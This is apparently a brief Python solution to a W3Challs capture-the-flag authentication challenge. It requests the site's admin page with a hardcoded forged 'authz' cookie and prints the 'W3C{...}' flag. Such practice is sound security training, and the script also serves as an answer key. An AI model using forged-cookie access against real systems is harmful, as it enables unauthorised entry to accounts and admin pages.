from requests import *

url = 'http://authentication.hax.w3challs.com/index.php?page=admin'
cookies = {
    'authz' : 'c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec'
}

r = get(url , cookies=cookies)
pos = r.text.find('W3C{')
while (True):
    print(r.text[pos] , end='')
    if (r.text[pos] == '}'):
        print()
        break
    pos += 1